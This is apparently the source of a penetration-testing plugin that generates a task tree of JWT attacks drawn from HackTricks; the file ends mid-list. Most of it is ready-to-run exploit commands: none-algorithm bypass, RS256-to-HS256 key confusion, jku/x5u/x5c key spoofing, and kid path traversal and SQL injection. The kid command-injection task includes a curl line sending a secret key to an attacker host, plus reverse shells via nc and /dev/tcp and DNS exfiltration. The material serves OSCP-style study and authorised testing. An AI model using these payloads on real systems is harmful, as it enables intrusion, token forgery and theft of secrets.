"""
JWT (JSON Web Token) security testing plugin

Generates tasks for JWT token exploitation including:
- JWT signature bypass (None algorithm)
- Algorithm confusion attacks (HS256 <-> RS256)
- Token tampering and manipulation
- JWT secret brute-forcing
- Header injection attacks (jku, x5u, kid)
- Embedded key vulnerabilities
- Token replay and expiry testing

Extracted from HackTricks: pentesting-web/hacking-jwt-json-web-tokens.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class JWTAttacksPlugin(ServicePlugin):
    """JWT token security testing plugin"""

    @property
    def name(self) -> str:
        return "jwt-attacks"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8000, 8080, 8443, 3000]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'ssl/http']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Detect HTTP/HTTPS services that may use JWT authentication

        Note: This plugin generates tasks for ANY web service.
        JWT detection happens during manual testing or automated scans.
        """
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common web ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate JWT security testing task tree"""

        tasks = {
            'id': f'jwt-attacks-{port}',
            'name': f'JWT Token Security Testing (Port {port})',
            'type': 'parent',
            'children': []
        }

        # PHASE 1: JWT Discovery & Analysis
        discovery_tasks = {
            'id': f'jwt-discovery-{port}',
            'name': 'JWT Discovery & Analysis',
            'type': 'parent',
            'children': []
        }

        # Task 1.1: JWT Detection
        discovery_tasks['children'].append({
            'id': f'jwt-detect-{port}',
            'name': 'Detect JWT Usage',
            'type': 'manual',
            'metadata': {
                'description': 'Identify JWT tokens in HTTP traffic (cookies, headers, parameters)',
                'tags': ['OSCP:HIGH', 'MANUAL', 'RECON'],
                'alternatives': [
                    'Burp Suite: Look for Authorization: Bearer header',
                    'Browser DevTools: Application > Storage > Cookies/LocalStorage',
                    'Manual: Search response for patterns like "eyJ..." (base64 JWT header)',
                    'curl -i http://{target}:{port} | grep -i "authorization\\|token\\|jwt"'
                ],
                'success_indicators': [
                    'JWT token found in Authorization: Bearer header',
                    'Token stored in cookie or localStorage',
                    'Base64 string starting with "eyJ" detected',
                    'Three dot-separated base64 segments (header.payload.signature)'
                ],
                'failure_indicators': [
                    'No JWT tokens in traffic',
                    'Application uses session cookies instead',
                    'Different authentication mechanism in use'
                ],
                'next_steps': [
                    'Copy JWT token for analysis',
                    'Decode token at jwt.io to examine claims',
                    'Note token location (header, cookie, parameter)',
                    'Check if token origin is client-side or server-side'
                ],
                'notes': 'JWT tokens have format: header.payload.signature (three base64url segments). Look in Authorization headers, cookies (jwt, token, auth), and localStorage. Server-side generation is more secure than client-side.'
            }
        })

        # Task 1.2: JWT Decoding
        discovery_tasks['children'].append({
            'id': f'jwt-decode-{port}',
            'name': 'Decode and Analyze JWT',
            'type': 'command',
            'metadata': {
                'command': f'jwt_tool <TOKEN>',
                'description': 'Decode JWT to examine header, payload, and signature algorithm',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                'flag_explanations': {
                    '<TOKEN>': 'The JWT token captured from traffic (copy full token)',
                    'jwt_tool': 'JWT analysis tool (https://github.com/ticarpi/jwt_tool)'
                },
                'success_indicators': [
                    'Header decoded showing algorithm (HS256, RS256, etc.)',
                    'Payload claims visible (username, role, exp, etc.)',
                    'Signature algorithm identified',
                    'Expiration time (exp claim) shown'
                ],
                'failure_indicators': [
                    'Invalid token format error',
                    'Base64 decode error',
                    'Token truncated or malformed'
                ],
                'next_steps': [
                    'Note the algorithm (HS256=symmetric, RS256=asymmetric, None=unsigned)',
                    'Check for sensitive claims: role, admin, isAdmin, permissions',
                    'Verify expiration claim (exp) if present',
                    'Check kid/jku/x5u header parameters for injection points'
                ],
                'alternatives': [
                    'Manual: echo "eyJ..." | base64 -d (decode each segment)',
                    'Online: Paste token at https://jwt.io',
                    'Python: import jwt; jwt.decode(token, options={"verify_signature": False})',
                    'Burp Extension: JSON Web Tokens (decode in Repeater)'
                ],
                'estimated_time': '1-2 minutes',
                'notes': 'Install jwt_tool: git clone https://github.com/ticarpi/jwt_tool && pip3 install pycryptodomex. Focus on algorithm type (determines attack vectors) and claims (for privilege escalation).'
            }
        })

        # Task 1.3: Check Token Origin
        discovery_tasks['children'].append({
            'id': f'jwt-origin-{port}',
            'name': 'Determine Token Generation Origin',
            'type': 'manual',
            'metadata': {
                'description': 'Check if JWT is generated server-side or client-side (affects key exposure risk)',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'RECON'],
                'success_indicators': [
                    'Token first appears in server response (secure)',
                    'Token generated by JavaScript in browser (potential key leak)',
                    'Token visible in client-side source code'
                ],
                'next_steps': [
                    'If client-side: Search JavaScript for signing keys/secrets',
                    'If server-side: Focus on signature bypass/confusion attacks',
                    'Check browser localStorage/sessionStorage for keys'
                ],
                'alternatives': [
                    'Burp Proxy: Review request/response history for first token occurrence',
                    'Browser DevTools: Network tab > filter by "token" or "auth"',
                    'View page source: Search for "jwt", "token", "sign" keywords'
                ],
                'notes': 'Client-side token generation often exposes secrets in JavaScript. Server-side generation is more secure but vulnerable to algorithm attacks.'
            }
        })

        tasks['children'].append(discovery_tasks)

        # PHASE 2: Quick Win Attacks
        quickwin_tasks = {
            'id': f'jwt-quickwin-{port}',
            'name': 'Quick Win Attacks',
            'type': 'parent',
            'children': []
        }

        # Task 2.1: Automated All Tests
        quickwin_tasks['children'].append({
            'id': f'jwt-all-tests-{port}',
            'name': 'Run All Automated Tests',
            'type': 'command',
            'metadata': {
                'command': f'python3 jwt_tool.py <TOKEN> -M at -t "http://{target}:{port}/api/endpoint" -rh "Authorization: Bearer <TOKEN>"',
                'description': 'Run all jwt_tool tests automatically (signature bypass, algorithm confusion, injection)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'AUTOMATED'],
                'flag_explanations': {
                    '<TOKEN>': 'Captured JWT token from traffic',
                    '-M at': 'Mode: All Tests (runs all attack vectors)',
                    '-t': 'Target URL (protected endpoint requiring JWT)',
                    '-rh': 'Request header (how JWT is sent in requests)',
                    'Authorization: Bearer': 'Standard JWT header format'
                },
                'success_indicators': [
                    'Green output indicating successful bypass',
                    'Valid response with tampered token',
                    'Access granted with modified claims',
                    'Tool reports "VULNERABLE" status'
                ],
                'failure_indicators': [
                    'All tests return 401 Unauthorized',
                    'Signature verification errors',
                    'No bypasses found',
                    'Connection errors or timeouts'
                ],
                'next_steps': [
                    'If bypass found: Extract successful test ID with -Q flag',
                    'Manually reproduce successful attack in Burp',
                    'Document vulnerable endpoint and attack vector',
                    'Test privilege escalation by changing role/admin claims'
                ],
                'alternatives': [
                    'Manual: Test each attack individually (None algorithm, RS256->HS256, etc.)',
                    'Burp Extension: SignSaboteur (automated JWT attacks)',
                    'Manual Burp testing: JSON Web Tokens extension'
                ],
                'estimated_time': '5-10 minutes',
                'notes': 'This automated scan tests: None algorithm, key confusion, header injection, claim tampering. Review jwt_tool output carefully - green lines indicate successful bypass. Use -Q flag to dump successful JWT for reuse.'
            }
        })

        # Task 2.2: None Algorithm Attack
        quickwin_tasks['children'].append({
            'id': f'jwt-none-alg-{port}',
            'name': 'None Algorithm Signature Bypass',
            'type': 'command',
            'metadata': {
                'command': f'python3 jwt_tool.py <TOKEN> -X a',
                'description': 'Test signature bypass by changing algorithm to "none" and removing signature',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'EXPLOIT'],
                'flag_explanations': {
                    '<TOKEN>': 'Original JWT token',
                    '-X a': 'Exploit mode: Algorithm confusion (includes "none" attack)',
                    'jwt_tool': 'Automatically sets alg="none" and removes signature'
                },
                'success_indicators': [
                    'Modified token accepted by server',
                    'Access granted without valid signature',
                    'No signature verification error',
                    'Can modify claims without detection'
                ],
                'failure_indicators': [
                    '401 Unauthorized response',
                    'Invalid signature error',
                    'Algorithm not allowed error',
                    'Token rejected'
                ],
                'next_steps': [
                    'If successful: Tamper with claims (username, role, admin)',
                    'Test privilege escalation with modified claims',
                    'Document as critical vulnerability (no signature verification)',
                    'Create admin token: Change claims to admin=true or role=admin'
                ],
                'alternatives': [
                    'Manual Burp: Modify header to {"alg":"none","typ":"JWT"}, remove signature, keep trailing dot',
                    'Burp Extension: JSON Web Tokens > Attack > None algorithm',
                    'Manual: base64url({"alg":"none","typ":"JWT"}).base64url({claims}).',
                    'Python: jwt.encode(payload, key="", algorithm="none")'
                ],
                'estimated_time': '2-3 minutes',
                'notes': 'Common misconfiguration where server accepts unsigned tokens. Format: header.payload. (note trailing dot with empty signature). Some libraries reject "none" but accept "None", "NONE", or "nOnE" (case variation bypass).'
            }
        })

        # Task 2.3: Token Tampering Without Signature
        quickwin_tasks['children'].append({
            'id': f'jwt-tamper-nosig-{port}',
            'name': 'Test Claim Tampering (Keep Original Signature)',
            'type': 'manual',
            'metadata': {
                'description': 'Modify payload claims without changing signature to check if verification is enforced',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'success_indicators': [
                    'Modified claims accepted without signature update',
                    'Changed username/role reflected in response',
                    'No signature verification performed',
                    'Privilege escalation achieved'
                ],
                'failure_indicators': [
                    'Invalid signature error',
                    'Token rejected',
                    'Original user context maintained'
                ],
                'next_steps': [
                    'If successful: Server not validating signatures (critical!)',
                    'Test various claim modifications: admin, role, username',
                    'Document as high-severity finding',
                    'Attempt account takeover with modified username'
                ],
                'alternatives': [
                    'Burp Repeater: Modify payload in JSON Web Tokens tab, send without re-signing',
                    'jwt.io: Change claims, copy modified token, ignore signature invalid warning',
                    'Manual: Base64 decode payload, modify JSON, base64 encode, replace in token',
                    'jwt_tool: python3 jwt_tool.py <TOKEN> -I -pc username -pv "admin"'
                ],
                'notes': 'Tests if server verifies signature at all. Try changing username to "admin", adding "admin":true claim, or changing role to "administrator". No signature update needed if server doesn\'t verify.'
            }
        })

        tasks['children'].append(quickwin_tasks)

        # PHASE 3: Algorithm Confusion Attacks
        alg_confusion_tasks = {
            'id': f'jwt-alg-confusion-{port}',
            'name': 'Algorithm Confusion Attacks',
            'type': 'parent',
            'children': []
        }

        # Task 3.1: RS256 to HS256 Confusion
        alg_confusion_tasks['children'].append({
            'id': f'jwt-rs256-hs256-{port}',
            'name': 'RS256 to HS256 Key Confusion (CVE-2016-5431)',
            'type': 'command',
            'metadata': {
                'command': f'openssl s_client -connect {target}:443 2>&1 < /dev/null | sed -n \'/-----BEGIN/,/-----END/p\' > cert.pem && openssl x509 -pubkey -in cert.pem -noout > pubkey.pem && python3 jwt_tool.py <TOKEN> -X k -pk pubkey.pem',
                'description': 'Exploit algorithm confusion by signing token with public key using HS256 (asymmetric->symmetric)',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'AUTOMATED'],
                'flag_explanations': {
                    'openssl s_client': 'Connect to TLS server to retrieve certificate',
                    '-connect {target}:443': 'Target host and HTTPS port',
                    'sed -n \'/-----BEGIN/,/-----END/p\'': 'Extract PEM certificate from output',
                    'openssl x509 -pubkey': 'Extract public key from certificate',
                    '-noout': 'Suppress certificate output, only show public key',
                    '-X k': 'jwt_tool: Key confusion exploit mode',
                    '-pk pubkey.pem': 'Public key file to use as HS256 secret'
                },
                'success_indicators': [
                    'Token with HS256 algorithm accepted',
                    'Public key used as HMAC secret successfully',
                    'Access granted with forged signature',
                    'Can modify claims and re-sign'
                ],
                'failure_indicators': [
                    'Algorithm mismatch error',
                    'Invalid signature',
                    'RS256 still enforced',
                    'Certificate retrieval failed'
                ],
                'next_steps': [
                    'If successful: Forge tokens with arbitrary claims',
                    'Escalate privileges: Change role to admin',
                    'Document as critical vulnerability (CVE-2016-5431)',
                    'Test with different public keys if multiple services'
                ],
                'alternatives': [
                    'Manual: Extract public key, use as HMAC secret in jwt.io with HS256',
                    'Burp Extension: JOSEPH > Key confusion attack > Load PEM',
                    'Manual Burp: JSON Web Tokens > Attack > Key confusion',
                    'For HTTP: openssl s_client -connect {target}:80 -starttls http'
                ],
                'estimated_time': '5-7 minutes',
                'notes': 'RS256 uses private key to sign, public key to verify. HS256 uses same secret for both. If server uses public key as HMAC secret when HS256 specified, we can forge signatures. Attack: Change alg to HS256, sign with known public key. Get public key from: TLS certificate, JWK endpoint, or X.509 certificate in x5c header.'
            }
        })

        # Task 3.2: Embedded Public Key Attack
        alg_confusion_tasks['children'].append({
            'id': f'jwt-embed-pubkey-{port}',
            'name': 'Embedded Public Key Injection (CVE-2018-0114)',
            'type': 'command',
            'metadata': {
                'command': f'openssl genrsa -out keypair.pem 2048 && openssl rsa -in keypair.pem -pubout -out publickey.crt && openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key && python3 jwt_tool.py <TOKEN> -X i -pr keypair.pem',
                'description': 'Inject attacker-controlled public key in JWT header, sign with matching private key',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'AUTOMATED'],
                'flag_explanations': {
                    'openssl genrsa': 'Generate RSA private key',
                    '-out keypair.pem': 'Output file for key pair',
                    '2048': 'Key size in bits (standard)',
                    'openssl rsa -pubout': 'Extract public key from private key',
                    'openssl pkcs8': 'Convert private key to PKCS#8 format',
                    '-topk8': 'Convert to PKCS#8',
                    '-nocrypt': 'No password encryption',
                    '-X i': 'jwt_tool: Inject public key exploit mode',
                    '-pr': 'Private key for signing'
                },
                'success_indicators': [
                    'Token with embedded public key accepted',
                    'Server uses embedded key for verification',
                    'Forged token validates successfully',
                    'Claims can be arbitrarily modified'
                ],
                'failure_indicators': [
                    'Server ignores embedded key',
                    'Uses trusted keystore instead',
                    'Invalid signature error',
                    'Header parameters rejected'
                ],
                'next_steps': [
                    'If successful: Generate tokens with any claims',
                    'Create admin token with elevated privileges',
                    'Document as critical (server trusts user-supplied keys)',
                    'Test other header injection points (jwk, x5c)'
                ],
                'alternatives': [
                    'Manual: Generate keys, extract n/e parameters, embed in jwk header, sign with private key',
                    'Burp Extension: JSON Web Tokens > CVE-2018-0114 attack',
                    'jwt.io: Paste public key in header as jwk object, use private key to sign',
                    'NodeJS script to extract n/e from public key for jwk header'
                ],
                'estimated_time': '10-15 minutes',
                'notes': 'Some servers trust embedded public keys in JWT header (jwk parameter). Attack: Generate keypair, embed public key in header, sign with private key. Server uses embedded key instead of trusted keystore. Extract n/e from public key using NodeJS RSA library for jwk header format.'
            }
        })

        tasks['children'].append(alg_confusion_tasks)

        # PHASE 4: Header Injection Attacks
        header_injection_tasks = {
            'id': f'jwt-header-injection-{port}',
            'name': 'Header Parameter Injection',
            'type': 'parent',
            'children': []
        }

        # Task 4.1: JKU (JWK Set URL) Spoofing
        header_injection_tasks['children'].append({
            'id': f'jwt-jku-spoofing-{port}',
            'name': 'JKU Header Spoofing Attack',
            'type': 'command',
            'metadata': {
                'command': f'python3 jwt_tool.py <TOKEN> -X s',
                'description': 'Modify jku header to point to attacker-controlled JWKS with custom signing keys',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'AUTOMATED'],
                'flag_explanations': {
                    '<TOKEN>': 'Original JWT token',
                    '-X s': 'jwt_tool: JWKS spoofing exploit mode',
                    'jku': 'JWK Set URL header parameter (points to public keys)',
                    'jwt_tool': 'Automatically generates malicious JWKS and modifies token'
                },
                'success_indicators': [
                    'Server fetches JWKS from attacker URL',
                    'HTTP request logged to attacker server',
                    'Token signed with attacker key accepted',
                    'Forged claims validated'
                ],
                'failure_indicators': [
                    'No HTTP request to attacker URL',
                    'JWKS URL validation/whitelist enforced',
                    'Invalid signature error',
                    'jku header ignored by server'
                ],
                'next_steps': [
                    'If HTTP request seen: Host malicious JWKS with attacker public key',
                    'Generate keypair, create JWKS JSON, host on attacker server',
                    'Sign token with attacker private key, set jku to attacker JWKS URL',
                    'Test SSRF: Set jku to internal URLs (http://localhost, http://169.254.169.254)'
                ],
                'alternatives': [
                    'Manual: Generate RSA keys, create JWKS JSON, host file, modify jku header',
                    'Burp Collaborator: Set jku to Collaborator URL to detect SSRF',
                    'Host JWKS: python3 -m http.server 8000 (serve malicious JWKS)',
                    'Online: Use jwt.io with custom jku and hosted JWKS'
                ],
                'estimated_time': '15-20 minutes',
                'notes': 'jku (JWK Set URL) header tells server where to fetch public keys. Attack: Set jku to attacker URL hosting malicious JWKS with attacker public key. Update jwtconf.ini with your JWKS URL. JWKS format: {"keys":[{"kty":"RSA","kid":"key-id","use":"sig","n":"...","e":"AQAB"}]}. Also test SSRF to internal endpoints.'
            }
        })

        # Task 4.2: X5U Header Spoofing
        header_injection_tasks['children'].append({
            'id': f'jwt-x5u-spoofing-{port}',
            'name': 'X5U (X.509 URL) Header Spoofing',
            'type': 'command',
            'metadata': {
                'command': f'openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt && openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem',
                'description': 'Generate X.509 certificate, modify x5u header to point to attacker certificate',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MANUAL'],
                'flag_explanations': {
                    'openssl req -x509': 'Create self-signed X.509 certificate',
                    '-nodes': 'No DES encryption on private key',
                    '-days 365': 'Certificate validity period',
                    '-newkey rsa:2048': 'Generate new 2048-bit RSA key',
                    '-keyout': 'Output file for private key',
                    '-out': 'Output file for certificate',
                    'openssl x509 -pubkey': 'Extract public key from certificate',
                    'x5u': 'X.509 URL header parameter (points to certificate chain)'
                },
                'success_indicators': [
                    'Server fetches certificate from attacker URL',
                    'HTTP request to attacker server logged',
                    'Token signed with attacker key accepted',
                    'Certificate validation bypassed'
                ],
                'failure_indicators': [
                    'No request to x5u URL',
                    'Certificate validation enforced',
                    'URL whitelist blocking attacker domain',
                    'Invalid signature error'
                ],
                'next_steps': [
                    'Host attacker.crt on web server: python3 -m http.server 8000',
                    'Modify JWT: Set x5u to http://attacker-ip:8000/attacker.crt',
                    'Sign token with attacker private key (attacker.key)',
                    'Test SSRF: Set x5u to internal URLs for certificate disclosure'
                ],
                'alternatives': [
                    'jwt.io: Paste private key and public key, set x5u header manually',
                    'Burp: Modify x5u in JSON Web Tokens extension, re-sign with attacker key',
                    'Test SSRF: x5u=http://169.254.169.254/latest/meta-data/ (AWS metadata)',
                    'Monitor: Use Burp Collaborator or ngrok for out-of-band detection'
                ],
                'estimated_time': '15-20 minutes',
                'notes': 'x5u (X.509 URL) points to PEM certificate for verification. Attack: Generate self-signed cert, host it, modify x5u to attacker URL, sign with attacker private key. Also test SSRF to internal services. Transport security (HTTPS) may be required but often not enforced.'
            }
        })

        # Task 4.3: X5C Header Injection
        header_injection_tasks['children'].append({
            'id': f'jwt-x5c-injection-{port}',
            'name': 'X5C (X.509 Certificate Chain) Injection',
            'type': 'command',
            'metadata': {
                'command': f'openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt && openssl x509 -in attacker.crt -outform PEM | base64 -w 0',
                'description': 'Embed base64-encoded attacker certificate directly in x5c header',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MANUAL'],
                'flag_explanations': {
                    'openssl req -x509': 'Generate self-signed certificate',
                    'openssl x509 -outform PEM': 'Output certificate in PEM format',
                    'base64 -w 0': 'Base64 encode without line wrapping',
                    'x5c': 'X.509 Certificate Chain header (array of base64 certs)',
                    '-w 0': 'No line wrapping (single line base64)'
                },
                'success_indicators': [
                    'Token with embedded certificate accepted',
                    'Server trusts user-supplied certificate',
                    'Forged signature validates',
                    'No certificate authority validation'
                ],
                'failure_indicators': [
                    'Certificate validation enforced',
                    'Trusted CA required',
                    'Invalid signature',
                    'x5c header ignored'
                ],
                'next_steps': [
                    'Copy base64 certificate output',
                    'Modify JWT header: "x5c":["<base64_cert>"]',
                    'Extract n, e, x5t from certificate for header',
                    'Sign token with attacker private key (attacker.key)',
                    'Use jwt.io or jwt_tool to forge token with modified header'
                ],
                'alternatives': [
                    'jwt_tool: python3 jwt_tool.py <TOKEN> -I -hc x5c -hv "<base64_cert>" -pr attacker.key',
                    'Manual: Modify header JSON, base64url encode, concatenate with payload and signature',
                    'Burp: JSON Web Tokens extension > Modify x5c array > Re-sign',
                    'Extract x5t thumbprint: openssl x509 -in attacker.crt -fingerprint -sha1 -noout | base64'
                ],
                'estimated_time': '10-15 minutes',
                'notes': 'x5c embeds certificate chain directly in token header (base64 array). If server trusts embedded certs without CA validation, attacker can inject self-signed cert and forge signatures. Also update n (modulus), e (exponent), x5t (thumbprint) header claims to match attacker certificate for consistency.'
            }
        })

        # Task 4.4: KID Parameter Exploitation
        header_injection_tasks['children'].append({
            'id': f'jwt-kid-exploit-{port}',
            'name': 'KID (Key ID) Parameter Attacks',
            'type': 'parent',
            'children': [
                {
                    'id': f'jwt-kid-traversal-{port}',
                    'name': 'KID Path Traversal',
                    'type': 'command',
                    'metadata': {
                        'command': f'python3 jwt_tool.py <TOKEN> -I -hc kid -hv "../../dev/null" -S hs256 -p ""',
                        'description': 'Exploit kid path traversal to use predictable file content as signing secret',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'flag_explanations': {
                            '<TOKEN>': 'Original JWT token',
                            '-I': 'Inject/tamper mode',
                            '-hc kid': 'Modify kid header claim',
                            '-hv': 'Header value (path traversal payload)',
                            '../../dev/null': 'Predictable file with empty content',
                            '-S hs256': 'Sign with HS256 algorithm',
                            '-p ""': 'Use empty string as password (matches /dev/null content)',
                            'kid': 'Key ID header (identifies which key to use)'
                        },
                        'success_indicators': [
                            'Token with traversed kid accepted',
                            'Server uses file content as signing secret',
                            'Forged signature validates',
                            'Predictable file path exploitation successful'
                        ],
                        'failure_indicators': [
                            'Path validation enforced',
                            'Invalid signature error',
                            'kid parameter sanitized',
                            'File not accessible to application'
                        ],
                        'next_steps': [
                            'Test other predictable files: /proc/sys/kernel/randomize_va_space (contains "2")',
                            'Try: kid="../../../proc/version" (known kernel version string)',
                            'Test null bytes: kid="key.pem%00../../dev/null"',
                            'SSRF attempt: kid="http://localhost/secret"'
                        ],
                        'alternatives': [
                            'Manual Burp: Modify kid header to "../../dev/null", sign with empty secret',
                            'Predictable files: /dev/null (empty), /proc/sys/kernel/randomize_va_space (2)',
                            'jwt.io: Set kid header, use predictable file content as secret',
                            'Test SQL injection: kid="key123\' OR 1=1--"'
                        ],
                        'estimated_time': '5-10 minutes',
                        'notes': 'kid tells server which key file to use. If not sanitized, traverse to files with known content. Common targets: /dev/null (empty), /proc files (predictable values). Sign token using file content as HMAC secret. Also test SSRF (kid=http://internal) and SQL injection (kid in database query).'
                    }
                },
                {
                    'id': f'jwt-kid-sqli-{port}',
                    'name': 'KID SQL Injection',
                    'type': 'command',
                    'metadata': {
                        'command': f'python3 jwt_tool.py <TOKEN> -I -hc kid -hv "non-existent\' UNION SELECT \'ATTACKER\'-- -" -S hs256 -p "ATTACKER"',
                        'description': 'SQL injection in kid parameter to force known secret key',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'SQLI'],
                        'flag_explanations': {
                            '-hv "non-existent\' UNION SELECT \'ATTACKER\'-- -"': 'SQL injection payload',
                            'UNION SELECT': 'SQL injection technique to return attacker-controlled value',
                            '\'ATTACKER\'': 'Known secret key value',
                            '-- -': 'SQL comment to ignore rest of query',
                            '-p "ATTACKER"': 'Sign with known secret (matches injected value)'
                        },
                        'success_indicators': [
                            'SQL injection successful',
                            'Server uses injected "ATTACKER" as secret',
                            'Token validates with known secret',
                            'Arbitrary claim modification possible'
                        ],
                        'failure_indicators': [
                            'SQL error message',
                            'kid parameter sanitized',
                            'Prepared statements prevent injection',
                            'Invalid signature error'
                        ],
                        'next_steps': [
                            'If successful: Forge tokens with any claims',
                            'Test other SQLi payloads: kid=\' OR 1=1--',
                            'Extract actual secrets: kid=\' UNION SELECT secret FROM keys--',
                            'Database enumeration via SQLi in kid'
                        ],
                        'alternatives': [
                            'Manual Burp: Inject SQL in kid header, sign with predicted secret',
                            'Test payloads: \' OR 1=1--, \' UNION ALL SELECT NULL--, 1\' ORDER BY 1--',
                            'Time-based: \' AND SLEEP(5)-- (detect blind SQLi)',
                            'Boolean-based: \' AND 1=1-- vs \' AND 1=2--'
                        ],
                        'estimated_time': '10-15 minutes',
                        'notes': 'If kid used in SQL query like SELECT secret FROM keys WHERE kid=\'$kid\', inject SQL to return known value. Example: kid=\' UNION SELECT \'mysecret\'-- forces server to use "mysecret" as signing key. Then sign token with "mysecret" as HMAC password.'
                    }
                },
                {
                    'id': f'jwt-kid-rce-{port}',
                    'name': 'KID Command Injection (RCE)',
                    'type': 'command',
                    'metadata': {
                        'command': f'python3 jwt_tool.py <TOKEN> -I -hc kid -hv "key.pem; curl http://attacker-ip/exfil?key=$(cat /root/keys/secret.key)&"',
                        'description': 'Command injection in kid parameter for RCE and key exfiltration',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'RCE'],
                        'flag_explanations': {
                            'key.pem;': 'Valid kid followed by command separator',
                            'curl http://attacker-ip': 'Exfiltrate data to attacker server',
                            '$(cat /root/keys/secret.key)': 'Command substitution to read secret key',
                            '&': 'Background command execution',
                            'kid': 'Key ID potentially used in shell command'
                        },
                        'success_indicators': [
                            'HTTP request received at attacker server',
                            'Secret key exfiltrated in URL parameter',
                            'Command execution confirmed',
                            'Out-of-band data received'
                        ],
                        'failure_indicators': [
                            'No network callback',
                            'Command sanitization enforced',
                            'kid parameter validated',
                            'No RCE vulnerability'
                        ],
                        'next_steps': [
                            'If RCE confirmed: Host HTTP server to receive exfiltrated keys',
                            'Extract keys: kid="; python3 -m http.server 8000 &"',
                            'Test reverse shell: kid="; nc attacker-ip 4444 -e /bin/bash &"',
                            'Use exfiltrated key to forge valid JWTs'
                        ],
                        'alternatives': [
                            'DNS exfiltration: kid="; nslookup $(cat secret.key).attacker.com &"',
                            'Blind RCE detection: kid="; sleep 10 &" (observe response delay)',
                            'File write: kid="; echo pwned > /tmp/proof.txt &"',
                            'Reverse shell: kid="; bash -i >& /dev/tcp/attacker-ip/4444 0>&1 &"'
                        ],
                        'estimated_time': '15-20 minutes',
                        'notes': 'If kid used in shell command like `openssl rsautl -verify -inkey $(cat keys/$kid)`, inject commands. Start listener: nc -lvnp 4444 or python3 -m http.server 8000. Payloads: ;whoami&, |id&, `curl http://attacker`, $(wget http://attacker). Test blind: sleep/ping delays.'
                    }
                }
            ]
        })

        tasks['children'].append(header_injection_tasks)

        # PHASE 5: Secret Brute-forcing
        bruteforce_tasks = {
            'id': f'jwt-bruteforce-{port}',
            'name': 'JWT Secret Brute-forcing',
            'type': 'parent',
            'children': []
        }

        # Task 5.1: Hashcat JWT Cracking
        bruteforce_tasks['children'].append({
            'id': f'jwt-hashcat-{port}',
            'name': 'Crack JWT Secret with Hashcat',
            'type': 'command',
            'metadata': {
                'command': f'hashcat -a 0 -m 16500 <TOKEN> /usr/share/wordlists/rockyou.txt',
                'description': 'Brute-force JWT HMAC secret using hashcat (HS256/HS384/HS512)',
                'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'AUTOMATED'],
                'flag_explanations': {
                    'hashcat': 'GPU-accelerated password cracking tool',
                    '-a 0': 'Attack mode: Straight wordlist attack',
                    '-m 16500': 'Hash mode: JWT (HS256/HS384/HS512)',
                    '<TOKEN>': 'Full JWT token to crack',
                    'rockyou.txt': 'Common password wordlist (~14M passwords)'
                },
                'success_indicators': [
                    'Secret cracked and displayed',
                    'Hashcat status: Cracked',
                    'Secret shown in output',
                    'Can now forge valid tokens'
                ],
                'failure_indicators': [
                    'Exhausted wordlist without match',
                    'Strong/random secret used',
                    'Status: Exhausted',
                    'No GPU available (slow CPU cracking)'
                ],
                'next_steps': [
                    'If cracked: Use secret to forge tokens with arbitrary claims',
                    'Create admin token: Use jwt.io with cracked secret',
                    'Test secret reuse across different endpoints/applications',
                    'Document secret strength (weak if in common wordlist)'
                ],
                'alternatives': [
                    'john: john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt',
                    'jwt_tool: python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt',
                    'hashcat rules: hashcat -a 0 -m 16500 <TOKEN> wordlist.txt -r /usr/share/hashcat/rules/best64.rule',
                    'Mask attack: hashcat -a 3 -m 16500 <TOKEN> ?l?l?l?l?l?l?l?l (8 lowercase)'
                ],
                'estimated_time': '10 minutes to several hours (wordlist dependent)',
                'notes': 'HMAC secrets are brute-forceable if weak. Success rate depends on secret complexity. GPU cracking is 100x faster than CPU. Try wordlists: rockyou.txt, fasttrack.txt, common-passwords.txt. For HS256 tokens only. RS256 (asymmetric) cannot be brute-forced this way.'
            }
        })

        # Task 5.2: JWT_Tool Dictionary Attack
        bruteforce_tasks['children'].append({
            'id': f'jwt-tool-crack-{port}',
            'name': 'JWT_Tool Dictionary Attack',
            'type': 'command',
            'metadata': {
                'command': f'python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt',
                'description': 'Dictionary attack on JWT secret using jwt_tool (slower than hashcat)',
                'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'AUTOMATED'],
                'flag_explanations': {
                    '-C': 'Crack mode (brute-force secret)',
                    '-d': 'Dictionary file path',
                    'rockyou.txt': 'Password wordlist',
                    'jwt_tool': 'Pure Python implementation (no GPU acceleration)'
                },
                'success_indicators': [
                    'Secret found and displayed',
                    'Cracking successful message',
                    'Can forge tokens with discovered secret'
                ],
                'failure_indicators': [
                    'Wordlist exhausted',
                    'No match found',
                    'Strong secret used',
                    'Very slow progress (use hashcat instead)'
                ],
                'next_steps': [
                    'Use cracked secret to sign modified tokens',
                    'Test privilege escalation with admin claims',
